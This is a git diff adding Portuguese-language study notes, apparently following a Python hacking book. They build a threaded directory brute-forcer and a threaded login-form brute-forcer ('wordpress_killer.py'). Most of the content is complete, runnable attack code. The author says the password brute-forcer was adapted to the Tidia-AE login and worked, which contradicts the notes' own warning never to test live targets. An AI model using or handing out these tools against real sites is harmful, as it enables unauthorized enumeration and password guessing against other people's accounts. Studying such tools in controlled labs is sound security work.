@@ -306,3 +306,305 @@ if __name__ == "__main__":
 ### Explorando o código
 
 Após a execução do código, foi bem sucedida a captura das páginas-padrão do WordPress do site.
+
+### Descobrindo diretórios e localizações de arquivo com ataque de força bruta
+
+Muitas vezes, você não terá conhecimento sobre o sistema de arquivos do seu alvo. Isso implica na utilização, de maneira geral, de *spiders*, como os encontrados no BurpSuite, para encontrar o caminho que uma mensagem está percorrendo. No entanto, é proveitoso criarmos nossa própria ferramenta de força bruta para entendermos o sistema de arquivos do alvo. Para isso precisaremos de uma wordlist
+
+No Kali, uma wordlist comum é a `rockyou.txt`, que já vem embutida no sistema através do diretório `/usr/share/wordlists`. Contudo, utilizaremos a wordlist do [SVNDigger](https://github.com/nathanmyee/SVNDigger), que existem para busca de diretórios.
+
+Criaremos o nosso `bruter.py`:
+
+```py
+import queue
+import requests
+import threading
+import sys
+
+# Agent é o agente q fará uma request online, não é usado neste código ainda
+AGENT = "Mozilla/5.0 (x11; Linux x86_64; rv:19) Gecko/20100101 Firefox/19.0"
+# Extensões de palavras
+EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
+# Site-alvo
+TARGET = 'http://testphp.vulnweb.com'
+# Número de threads
+THREADS = 50
+# Local da wordlist
+WORDLIST = 'C:\\Users\\caioe\\Downloads\\wordlists_svn\\SVNDigger-master\\SVNDigger\\all.txt'
+
+# Função get_words, que pega todas as palavras da wordlist e as coloca numa fila. Ela também coloca extensões sobre ela
+def get_words(resume=None):
+        
+    # Função interna para colocar palavras na fila
+    def extend_words(word):
+        if '.' in word:
+            words.put(f'/{word}')   # se é um nome com extensão (ex: a.html -> /a.html)
+        else:
+            words.put(f'/{word}/')  # se é um nome sem extensão (ex: b -> /b/)
+            
+        for extension in EXTENSIONS:
+            words.put(f'/{word}{extension}')    # gera mais palavras com as extensões desejadas
+      
+    with open(WORDLIST) as f:   # Lê o arquivo
+        raw_words = f.read()
+    
+    found_resume = False    # variável de verificação, para atestar se a palavra-inicio já foi perpassada na lista
+    words = queue.Queue()   # fila de palavras
+    
+    for word in raw_words.split():  # divide todo o arquivo em um array de strings
+        if resume is not None:      # caso tenha uma palavra-inicio, a função não faz nada até encontrá-la 
+                                    # (para gerar uma lista parcial de palavras)
+            if found_resume:
+                extend_words(word)  # Caso ela já tenha sido encontrada, adiciona normalmente à lista
+            elif word == resume:
+                found_resume = True # ao encontrar a palavra, ele fala ao programa "Continue daqui"
+                print(f'Retornando lista de palavras feitas a partir de: {resume}')
+        else:
+            # Caso não tenha palavra-inicio, extende todas as palavras da lista
+            print(word)
+            extend_words(word)
+
+    return words
+
+
+if __name__ == '__main__':
+    w = get_words()
+    print("Pressione Enter para continuar")
+```
+
+Agora, adaptando o código para fazer as requests na função `dir_bruter()`:
+
+```py
+import queue
+import requests
+import threading
+import sys
+
+AGENT = "Mozilla/5.0 (x11; Linux x86_64; rv:19) Gecko/20100101 Firefox/19.0"
+EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
+TARGET = 'http://testphp.vulnweb.com'
+THREADS = 50
+WORDLIST = 'C:\\Users\\caioe\\Downloads\\wordlists_svn\\SVNDigger-master\\SVNDigger\\all.txt'
+
+def get_words(resume=None):
+        
+    def extend_words(word):
+        if '.' in word:
+            words.put(f'/{word}')
+        else:
+            words.put(f'/{word}/')
+            
+        for extension in EXTENSIONS:
+            words.put(f'/{word}{extension}')
+      
+    with open(WORDLIST) as f:
+        raw_words = f.read()
+    
+    found_resume = False
+    words = queue.Queue()
+    
+    for word in raw_words.split():
+        if resume is not None:
+            if found_resume:
+                extend_words(word)
+            elif word == resume:
+                found_resume = True
+                print(f'Retornando lista de palavras feitas a partir de: {resume}')
+        else:
+            extend_words(word)
+
+    return words
+
+# Nova função dir_bruter() que cria requests apenas com um header simples (dizendo que é uma request feita de um navegador)
+# e tenta fazer a resquest
+def dir_bruter(words):
+    header = {'User-Agent': AGENT}
+    while not words.empty():
+        url = f'{TARGET}{words.get()}'  # faz a url com as palavras da wordlist
+        try:
+            r = requests.get(url, headers=header)
+        except requests.exceptions.ConnectionError: # caso não seja feita, printa x
+            sys.stdout.write('x')
+            sys.stdout.flush()
+            continue
+        
+        if r.status_code == 200:
+            print(f'\nSucesso ({r.status_code}: {url})')    # caso seja sucesso (codigo 200) ele indica onde foi feita
+        elif r.status_code == 404:  # cason não seja, retorna .
+            sys.stdout.write('.')
+            sys.stdout.flush()
+        else:
+            print(f'{r.status_code} => {url}')  
+
+        
+if __name__ == '__main__':
+    w = get_words('')
+    print("Pressione Enter para continuar")
+    sys.stdin.readline()
+    
+    for _ in range(THREADS):    # chama threads para executar a função
+        t = threading.Thread(target=dir_bruter, args=(w, ))
+        t.start()
+```
+
+### Explorando o código
+
+Você pode executá-lo sem os prints e o input, removendo-os e colocando o output em um arquivo:
+
+`python bruter.py > ./output.txt`
+
+Pronto! Agora você tem um buscador de diretórios de sites!
+
+### Autenticação de formulário HTML com ataque de força bruta
+
+Criaremos um sistema de força bruta simples para sites WordPress. Os autores mencionam que eles ainda não possuem bloqueios de login ou CAPTCHAs rigorosos. Para isso veremos como funciona o formulário padrão do WordPress:
+
+```php
+<form name="loginform" id="loginform"
+    action="http://boodelyboo.com/wordpress/wp-login.php" method="post">
+    <p>
+        <label for="user_login">Username or Email Address</label>
+        <input type="text" name="log" id="user_login" value="" size="20"/>
+    </p>
+    
+    <div class="user-pass-wrap">
+        <label for="user_pass">Password</label>
+            <div class="wp-pwd">
+                <input type="password" name="pwd" id="user_pass" value="" size="20" />
+            </div>
+    </div>
+
+    <p class="submit">
+        <input type="submit" name="wp-submit" id="wp-submit" value="Log In" />
+        <input type="hidden" name="testcookie" value="1" />
+    </p>
+</form>
+```
+
+Foram omitidas partes não importantes para o estudo, mas restaram alguns fatos:
+
+- O login é feito através de um POST HTTP
+- O campo `pwd` é onde a senha é colocada
+- O campo `log` é onde o usuário é colocado
+
+Logo, seguindo a lógica, deveremos elaborar um fluxo para realizar um ataque de força-bruta:
+
+1. Recuperar a página de login e aceitar os Cookies solicitados
+2. Extrair todos os elementos do formulário HTML
+3. Definir o nome de usuário e/ou senha com uma das tentativas do nosso dicionário
+4. Enviar um POST para o script de processamento de login com todos os campos do HTML e com os cookies armazenados
+5. Realizar o teste para ver se conseguiu-se fazer a solicitação
+
+Para isso, poderemos pegar uma wordlist [cain-and-abel.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Software/cain-and-abel.txt) ela pode ser pega diretamente do github. Nesse mesmo repositório existem outras wordlists para possíveis outros projetos de hacking. Essa wordlist vem de um programa de recuperação de senhas do windows chamado `Cain & Abel`.
+
+É importante salientar que nunca se deve realizar esses testes em um alvo ativo. Sempre configure uma instância da sua aplicação web  de destino com credenciais conhecidas.
+
+Criaremos um novo arquivo `wordpress_killer.py`:
+
+```py
+# Utilizaremos o mesmo parser que usamos anteriormente
+from io import BytesIO
+from lxml import etree
+from queue import Queue
+
+import requests
+import sys
+import threading
+import time
+
+# Uma mensagem de verificação de login. Deve ser diferente para cada site
+SUCCESS = '"loggedIn": true'
+TARGET = "link" # link - alvo
+WORDLIST = 'C:\\Users\\caioe\\Desktop\\VM\\wordlists\\cain.txt'
+
+# Pega as palavras da wordlist
+def get_words():
+    with open(WORDLIST) as f:
+        raw_words = f.read()
+    
+    words = Queue()
+    for word in raw_words.split():
+        words.put(word)
+    return words
+
+# Procura os campos de input do alvo, parecido com o parser feito antes
+def get_params(content):
+    params = dict()
+    parser = etree.HTMLParser()
+    tree = etree.parse(BytesIO(content), parser=parser)
+    for elem in tree.findall('.//input'):
+        name = elem.get('name')
+        if name is not None:
+            params[name] = elem.get('value', None)
+    return params
+
+# Nossa classe Bruter, que fará o ataque
+class Bruter:
+    def __init__(self, username, url):
+        self.username = username
+        self.url = url
+        self.found = False
+        print(f'\nIniciando ataque de força bruta em {url}\n')
+        print("Concluida a configuracao na qual o nome de usuario eh: %s\n" % username)
+
+    # Essa função apenas instancia as threads de execução 
+    def run_bruteforce(self, passwords, type):
+        for _ in range(10):
+            t = threading.Thread(target=self.web_bruter, args=(passwords, type, ))
+            t.start()
+    
+    # Web bruter recebe a lista de palavras e o tipo de request (se é JSON ou URL)
+    def web_bruter(self, passwords, type):
+        session = requests.Session()        # inicia uma sessão, para manter o login
+        resp0 = session.get(self.url)       # faz um get na URL de target (pagina de login) para achar seus campos com o parser
+        params = get_params(resp0.content)  # procura os parametros usando o parser
+        params['eid'] = self.username       # Intancia os campos a serem colocados, voce pode colocar como quiser, 
+                                            # mas eles devem obedecer o forms de request
+        
+        # Usado para WP. Para Tidia-AE, usarei o outro
+        if type == 'JSON':
+            while not passwords.empty() and not self.found:
+                time.sleep(5)
+                pw = passwords.get()
+                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')   # Print da tentativa
+                params['pw'] = pw
+            
+                resp1 = session.post(self.url, data=params) # coloca o JSON na request e faz-la
+                if SUCCESS in resp1.content.decode():       # se acha a string de sucesso na resposta, printa a senha e para
+                    self.found = True
+                    print(f'\n Ataque de força bruta bem sucedido')
+                    print("Nome de usuario eh: %s" % self.username)
+                    print("Senha eh: %s\n" % pw)
+                    print('Concluido: limpando as outras threads...')
+    
+        if type == 'URL':
+            while not passwords.empty() and not self.found:
+                # Mesmo sentido. No caso foi usado para o Tidia-ae e tem os campos eid (user) pw (password) e submit ('Login')
+                time.sleep(5)
+                pw = passwords.get()
+                params['pw'] = pw
+                params['submit'] = 'Login'
+                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')   
+                in_link_url = f"{self.url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"   # Gera a URL customizada com os parametros
+                resp1 = session.post(in_link_url)
+
+                if SUCCESS in resp1.content.decode():
+                    self.found = True
+                    print(f'\n Ataque de força bruta bem sucedido')
+                    print("Nome de usuario eh: %s" % self.username)
+                    print("Senha eh: %s\n" % pw)
+                    print('Concluido: limpando as outras threads...')
+            
+if __name__ == '__main__':
+    words = get_words()
+    b = Bruter('user', TARGET)
+    b.run_bruteforce(words, 'URL')
+```
+
+Pronto! Agora você tem um código de brute-force eficiente!
+
+### Explorando o código
+
+O código acima está diferente do livro pois preferi usá-lo em um site que não é WordPress e que não recebe um JSON. Contudo, foi possível modificá-lo de uma forma bacana e agora ficará mais fácil para as próximas vezes. Ele foi estado com a word list e deu certo!
+
+**OBSERVAÇÃO**: É importante entender como o site recebe e responde as request de login para executar o código!
